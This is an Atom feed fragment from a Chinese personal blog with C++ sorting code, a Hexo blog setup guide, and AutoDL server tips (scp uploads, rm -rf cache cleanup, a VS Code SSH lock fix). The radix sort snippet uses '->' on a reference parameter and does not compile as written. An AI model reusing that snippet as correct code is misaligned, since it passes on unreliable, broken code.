if (L.data[i] &lt;&#x3D; L.data[j])            temp[k++] &#x3D; L.data[i++];        else            temp[k++] &#x3D; L.data[j++];    &#125;    &#x2F;&#x2F; 处理剩余元素    while (i &lt;&#x3D; mid)        temp[k++] &#x3D; L.data[i++];    while (j &lt;&#x3D; high)        temp[k++] &#x3D; L.data[j++];    &#x2F;&#x2F; 将排序好的数据拷贝回原数组    for (i &#x3D; low, k &#x3D; 0; i &lt;&#x3D; high; i++, k++)        L.data[i] &#x3D; temp[k];    delete[] temp; &#x2F;&#x2F; 释放临时数组&#125;&#x2F;&#x2F; 递归分治函数void MSort(Sqlist &amp;L, int low, int high)&#123;    if (low &lt; high)    &#123;        int mid &#x3D; (low + high) &#x2F; 2; &#x2F;&#x2F; 计算中间位置        MSort(L, low, mid);         &#x2F;&#x2F; 递归左半部分        MSort(L, mid + 1, high);    &#x2F;&#x2F; 递归右半部分        Merge(L, low, mid, high);   &#x2F;&#x2F; 合并已排序部分    &#125;&#125;&#x2F;&#x2F; 归并排序入口函数void MergeSort(Sqlist &amp;L)&#123;    if (L.length &lt;&#x3D; 0)        return;    MSort(L, 0, L.length - 1); &#x2F;&#x2F; 调用递归排序&#125;</code></pre><p><strong>基数排序</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;#define MAXSIZE 100typedef struct&#123;    int data[MAXSIZE];    int length;&#125; Sqlist;&#x2F;&#x2F; 以位数比较为例void RadixSort(Sqlist &amp;L)&#123;    if (L-&gt;length &lt;&#x3D; 1)        return;    int max_num &#x3D; L-&gt;data[0];    for (int i &#x3D; 1; i &lt; L-&gt;length; ++i)    &#123;        if (L-&gt;data[i] &gt; max_num)            max_num &#x3D; L-&gt;data[i];    &#125;    for (int exp &#x3D; 1; max_num &#x2F; exp &gt; 0; exp *&#x3D; 10)    &#123;        int count[10] &#x3D; &#123;0&#125;;        int output[MAXSIZE];        for (int i &#x3D; 0; i &lt; L-&gt;length; ++i)        &#123;            int digit &#x3D; (L-&gt;data[i] &#x2F; exp) % 10;            count[digit]++;        &#125;        for (int j &#x3D; 1; j &lt; 10; ++j)        &#123;            count[j] +&#x3D; count[j - 1];        &#125;        for (int i &#x3D; L-&gt;length - 1; i &gt;&#x3D; 0; --i)        &#123;            int digit &#x3D; (L-&gt;data[i] &#x2F; exp) % 10;            output[count[digit] - 1] &#x3D; L-&gt;data[i];            count[digit]--;        &#125;        for (int i &#x3D; 0; i &lt; L-&gt;length; ++i)        &#123;            L-&gt;data[i] &#x3D; output[i];        &#125;    &#125;&#125;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;data-structure&quot;&gt;Data Structure&lt;/h1&gt;
&lt;h2 id=&quot;线性表&quot;&gt;线性表&lt;/h2&gt;
&lt;h3 id=&quot;顺序表&quot;&gt;顺序表&lt;/h3&gt;
&lt;pre class=&quot;language-c++&quot; data-language=&quot;c++&quot;&gt;&lt;co</summary>
      
    
    
    
    <category term="笔记" scheme="https://saintcen.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="CS基础" scheme="https://saintcen.github.io/tags/CS%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>Hexo-Blog搭建教程</title>
    <link href="https://saintcen.github.io/2025/09/25/Hexo-Blog%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"/>
    <id>https://saintcen.github.io/2025/09/25/Hexo-Blog%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/</id>
    <published>2025-09-24T16:00:00.000Z</published>
    <updated>2025-10-03T08:05:29.325Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2025/09/25/Hexo-Blog%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/1.png"></p><p>在思考如何搭建个人博客时，我决定采用了<code>Hexo</code>+<code>Github Pages</code>的方案。</p><ul><li>纯静态资源网站，只需修改前端代码和资源文件</li><li><code>Github</code>托管，免费且易于维护</li><li><code>Hexo</code>提供了优秀的博客模板和便捷的命令行</li></ul><h2 id="参考资料">参考资料</h2><p>官方文档：<a href="https://hexo.io/zh-cn/docs/configuration">配置 |Hexo</a></p><p>大佬的博客1：<a href="https://bg51717.github.io/13640/">Hexo+Github搭建个人Wiki风格博客| Blogs</a></p><p>大佬的博客2：[<a href="https://aiyoja.github.io/20220704/">三万字教程]基于Hexo的matery主题搭建博客并深度优化一站式完全教程- 游颜色</a></p><h2 id="环境搭建">环境搭建</h2><h3 id="基本工具">基本工具</h3><p>搭建过程中，需要利用<code>npm</code>下载相关包，用<code>git</code>上传到指定仓库。</p><ul><li><a href="https://link.zhihu.com/?target=https%3A//nodejs.org/zh-cn">Node.js</a></li><li><a href="https://link.zhihu.com/?target=https%3A//git-scm.com/downloads">git</a></li></ul><p>具体如何安装使用请自行搜索。</p><h3 id="项目部署">项目部署</h3><p>1.在<code>Github</code>上创建一个仓库并取名为<code>用户名.github.io</code></p><p>2.准备一个空文件夹，在文件夹里打开终端，使用<code>npm</code>一键安装<code>Hexo</code>博客程序</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> <span class="token parameter variable">-g</span> hexo-cli</code></pre><p>3.进行<code>Hexo</code>初始化</p><pre class="language-bash" data-language="bash"><code class="language-bash">hexo init </code></pre><p>4.使用<code>npm</code>安装<code>package.json</code>里面的依赖</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span></code></pre><p>5.安装用于部署的包<code>hexo-deployer-git</code></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-deployer-git <span class="token parameter variable">--save</span></code></pre><p>6.修改<code>_config.yml</code>文件末尾的<code>Deployment</code>部分（善用查找！）</p><p><strong>这里建议大家用<code>SSH</code>配置，可以避免网络等问题</strong>。</p><p><a href="https://blog.csdn.net/weixin_42569846/article/details/105808683">Hexo使用SSH连接GitHub_hexo的ssh连接github-CSDN博客</a></p><pre class="language-none"><code class="language-none">deploy:    type: git  repo: git@github.com:你的用户名&#x2F;你的仓库名.git    branch: main</code></pre><h3 id="主题安装">主题安装</h3><p>我选择的是<code>matery</code>，大家也可以去搜索自己喜欢的主题。</p><p><a href="https://bgithub.xyz/blinkfox/hexo-theme-matery">GitHub -blinkfox/hexo-theme-matery</a></p><p>具体安装视官方文档而定，大部分可以这么安装。</p><pre class="language-none"><code class="language-none">cd &lt;Your Location&gt;git clone https:&#x2F;&#x2F;github.com&#x2F;blinkfox&#x2F;hexo-theme-matery.git</code></pre><p>随后，请修改<strong>主文件夹下的</strong><code>_config.yml</code>的<code>theme</code>。</p><blockquote><p>有两个<code>_config.yml</code>？</p></blockquote><h3 id="公式-mathjax">公式-Mathjax</h3><p>1.卸载部分插件</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> un hexo-math<span class="token function">npm</span> un hexo-renderer-marked</code></pre><p>2.安装<code>hexo-renderer-pandoc</code>渲染器</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> i hexo-renderer-pandoc</code></pre><p>3.配置主题配置下的<code>mathjax</code>设置(文件位置在<code>\themes\{主题名}\ _config.yml</code></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># MathJax</span>mathjax:  enable: <span class="token boolean">true</span>  per_page: <span class="token boolean">true</span></code></pre><p>4.安装<code>Pandoc</code></p><p>去<code>Pandoc</code>官网下载最新版本：<a href="https://pandoc.org/index.html">Pandoc - About pandoc</a></p><p>安装完将<code>_post</code>里的<code>md</code>文件写入公式测试即可。</p><h3 id="图片">图片</h3><p>修改<code>_config.yml</code>如下：</p><pre class="language-text" data-language="text"><code class="language-text">post_asset_folder: truemarked:  prependRoot: true  postAsset: true</code></pre><p>在文件夹下打开终端，使用<code>hexo new [layout] &lt;title&gt;</code>命令创建一篇新文章（也可以手动创建），此时会在<code>source/_post</code>目录下创建一个同名的文件夹和<code>md</code>文件。接着可以把所有该文章有关的资源文件都放在同名的目录中，在<code>md</code>文件中使用引入格式<code>![image1](image1.png)</code>即可引入图片（如果是网络资源引用网址即可）。</p><h2 id="四大命令">四大命令</h2><pre class="language-bash" data-language="bash"><code class="language-bash">hexo clean <span class="token comment"># 清除生成的网页文件</span>hexo g     <span class="token comment"># 生成静态网页</span>hexo s     <span class="token comment"># 本地运行博客</span>hexo d     <span class="token comment"># 将网页文件推送至远程服务器</span></code></pre><h2 id="问题记录">问题记录</h2><blockquote><p>所有问题的排查，请善用F12控制台的报错信息</p></blockquote><h3 id="渲染报错">渲染报错</h3><pre class="language-none"><code class="language-none">Uncaught TypeError: $(...).lightGallery is not a function</code></pre><p><a href="https://cloud.tencent.com/developer/ask/sof/113583944">Uncaught：$(.).lightGallery不是函数-腾讯云开发者社区-腾讯云</a></p><p>把所有本地硬编码替换成<code>cdn</code>，包括<code>_config.yml</code>里的<code>lib</code>和<code>main-style.ejs/layout.ejs</code>的引用。</p><pre class="language-none"><code class="language-none">lightgallery:https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;lightgallery&#x2F;1.10.0&#x2F;css&#x2F;lightgallery.css</code></pre><pre class="language-none"><code class="language-none">&lt;script src&#x3D;&quot;&lt;%- theme.libs.js.lightgallery %&gt;&quot;&gt;&lt;&#x2F;script&gt;</code></pre><pre class="language-none"><code class="language-none">&lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;&lt;%- theme.libs.css.lightgallery %&gt;&quot;&gt;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2025/09/25/Hexo-Blog%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/1.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;在思考如何搭建个人博客时，我决定采用了&lt;code&gt;Hexo&lt;/code&gt;+&lt;code&gt;Github Pag</summary>
      
    
    
    
    <category term="教程" scheme="https://saintcen.github.io/categories/%E6%95%99%E7%A8%8B/"/>
    
    
    <category term="开发" scheme="https://saintcen.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>AutoDL小trick（更新中）</title>
    <link href="https://saintcen.github.io/2025/09/25/AutoDL%E5%B0%8Ftrick%EF%BC%88%E6%9B%B4%E6%96%B0%E4%B8%AD%EF%BC%89/"/>
    <id>https://saintcen.github.io/2025/09/25/AutoDL%E5%B0%8Ftrick%EF%BC%88%E6%9B%B4%E6%96%B0%E4%B8%AD%EF%BC%89/</id>
    <published>2025-09-24T16:00:00.000Z</published>
    <updated>2025-10-15T16:45:01.090Z</updated>
    
    <content type="html"><![CDATA[<h2 id="scp">scp</h2><p>手动拉拽不支持文件夹，<code>Linux</code>和<code>Powershell</code>均支持<code>scp</code>命令。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">scp</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-P</span> <span class="token number">21075</span> /media/dzc/Data/GeoPixel-7B root@connect.westc.gpuhub.com:/root/autodl-tmp/</code></pre><p><code>-r</code>表示文件夹，<code>-P</code>表示端口，<code>/media/dzc/Data/GeoPixel-7B</code>是待上传文件，<code>root@connect.westc.gpuhub.com</code>是远程<code>SSH</code>主机，<code>/root/autodl-tmp/GeoPixel</code>是远程主机的文件夹，随后根据提示输入密码，等待上传即可。</p><h2 id="缓存清理">缓存清理</h2><p>参考<a href="https://www.autodl.com/docs/">AutoDL帮助文档</a></p><p>以下两个是可以直接删除，不影响系统运行的目录。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">du</span> <span class="token parameter variable">-sh</span> /root/miniconda3/pkgs/ <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> /root/miniconda3/pkgs/*      <span class="token comment"># conda的历史包</span><span class="token function">du</span> <span class="token parameter variable">-sh</span> /root/.local/share/Trash <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> /root/.local/share/Trash   <span class="token comment"># jupyterlab的回收站</span></code></pre><p>以下两个是可能占用较大空间，但需要根据实际情况清理的目录。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">du</span> <span class="token parameter variable">-sh</span> /tmp/         <span class="token comment">#查看/tmp占用的空间大小</span><span class="token function">du</span> <span class="token parameter variable">-sh</span> /root/.cache  <span class="token comment">#查看/root/.cache占用的空间大小</span></code></pre><h2 id="连接不上服务器">连接不上服务器</h2><p>参考<a href="https://blog.csdn.net/qq_46106285/article/details/132360266?spm=1001.2014.3001.5506">【经验】VScode远程 SSH 连接 Ubuntu 或 TrueNas 出错，Could not establishconnection</a><br></p><p>本人的遇到的报错这里没有提到。</p><pre class="language-none"><code class="language-none">Setting up SSH Host connect.westb.seetacloud.com: Waiting for other windows to connectLocalLockTimeout │ Error: LocalLockTimeout (Timed out while waiting for the local startup lock)                                                                       </code></pre><p>检查一下<code>output</code></p><pre class="language-none"><code class="language-none">[20:49:01.519] Log Level: 2[20:49:01.533] SSH Resolver called for &quot;ssh-remote+connect.westb.seetacloud.com&quot;, attempt 1[20:49:01.537] remote.SSH.useLocalServer &#x3D; true[20:49:01.537] remote.SSH.useExecServer &#x3D; true[20:49:01.537] remote.SSH.bindHost &#x3D; &#123;&#125;[20:49:01.537] remote.SSH.path &#x3D; [20:49:01.537] remote.SSH.configFile &#x3D; [20:49:01.537] remote.SSH.useFlock &#x3D; true[20:49:01.537] remote.SSH.lockfilesInTmp &#x3D; false[20:49:01.537] remote.SSH.localServerDownload &#x3D; auto[20:49:01.537] remote.SSH.remoteServerListenOnSocket &#x3D; false[20:49:01.537] remote.SSH.defaultExtensions &#x3D; [][20:49:01.537] remote.SSH.defaultExtensionsIfInstalledLocally &#x3D; [][20:49:01.537] remote.SSH.loglevel &#x3D; 2[20:49:01.538] remote.SSH.enableDynamicForwarding &#x3D; true[20:49:01.538] remote.SSH.enableRemoteCommand &#x3D; false[20:49:01.538] remote.SSH.serverPickPortsFromRange &#x3D; &#123;&#125;[20:49:01.538] remote.SSH.serverInstallPath &#x3D; &#123;&#125;[20:49:01.538] remote.SSH.permitPtyAllocation &#x3D; false[20:49:01.538] remote.SSH.preferredLocalPortRange &#x3D; undefined[20:49:01.538] remote.SSH.useCurlAndWgetConfigurationFiles &#x3D; false[20:49:01.538] remote.SSH.experimental.chat &#x3D; true[20:49:01.538] remote.SSH.experimental.enhancedSessionLogs &#x3D; true[20:49:01.538] remote.SSH.httpProxy &#x3D; &#123;&quot;*&quot;:&quot;&quot;&#125;[20:49:01.538] remote.SSH.httpsProxy &#x3D; &#123;&quot;*&quot;:&quot;&quot;&#125;[20:49:01.544] VS Code version: 1.104.1[20:49:01.544] Remote-SSH version: remote-ssh@0.120.0[20:49:01.544] linux x64[20:49:01.547] SSH Resolver called for host: connect.westb.seetacloud.com[20:49:01.547] Setting up SSH remote &quot;connect.westb.seetacloud.com&quot;[20:49:01.551] Acquiring local install lock: &#x2F;media&#x2F;dzc&#x2F;Data&#x2F;tmp&#x2F;vscode-remote-ssh-43daf7d8-install.lock[20:49:03.052] Starting to look for password prompt from another window[20:51:01.698] Resolver error: Error: Timed out while waiting for the local startup lock    at y.Create (&#x2F;home&#x2F;dzc&#x2F;.vscode&#x2F;extensions&#x2F;ms-vscode-remote.remote-ssh-0.120.0&#x2F;out&#x2F;extension.js:2:744751)    at &#x2F;home&#x2F;dzc&#x2F;.vscode&#x2F;extensions&#x2F;ms-vscode-remote.remote-ssh-0.120.0&#x2F;out&#x2F;extension.js:2:793216    at r (&#x2F;home&#x2F;dzc&#x2F;.vscode&#x2F;extensions&#x2F;ms-vscode-remote.remote-ssh-0.120.0&#x2F;out&#x2F;extension.js:2:507932)    at &#x2F;home&#x2F;dzc&#x2F;.vscode&#x2F;extensions&#x2F;ms-vscode-remote.remote-ssh-0.120.0&#x2F;out&#x2F;extension.js:2:508185    at FSReqCallback.oncomplete (node:fs:188:23)[20:51:01.707]  ---------- [Session Summary] ----------- [20:51:01.707] [LocalLockTimeout]: Error: LocalLockTimeout (Timed out while waiting for the local startup lock)</code></pre><p>删除锁文件，重启<code>Vscode</code>连接即可。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-f</span> /media/dzc/Data/tmp/vscode-remote-ssh-43daf7d8-install.lock</code></pre><h2 id="先下载模型文件再下载">先下载模型文件再下载</h2><p>想直接在云服务器用<code>VPN</code>下载可以参考这个仓库<a href="https://github.com/VocabVictor/clash-for-AutoDL">clash-for-AutoDL</a></p><p>但我个人建议，还是先在本地用<code>VPN</code>下载后再用<code>scp</code>上传，注意，有些代码会自动从网站下载文件，你需要修改代码让它从本地读取。</p><h2 id="安装依赖项">安装依赖项</h2><p><code>pip</code>和<code>conda</code>使用镜像源能加速下载依赖包，但部分镜像源高峰期比较拥挤。切换源方法：</p><p><img src="https://www.autodl.com/docs/source.assets/image-20220419113133712.png"></p><p><img src="https://www.autodl.com/docs/source.assets/image-20220419113057670.png"></p><p>直接点击确定即可，无需重启实例。另外也可以通过命令行修改配置文件(<code>.condarc</code>)，不详细展开。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;scp&quot;&gt;scp&lt;/h2&gt;
&lt;p&gt;手动拉拽不支持文件夹，&lt;code&gt;Linux&lt;/code&gt;和&lt;code&gt;Powershell&lt;/code&gt;均支持&lt;code&gt;scp&lt;/code&gt;命令。&lt;/p&gt;
&lt;pre class=&quot;language-bash&quot; data-l</summary>
      
    
    
    
    <category term="科研" scheme="https://saintcen.github.io/categories/%E7%A7%91%E7%A0%94/"/>
    
    
    <category term="AI" scheme="https://saintcen.github.io/tags/AI/"/>
    
  </entry>
  
</feed>
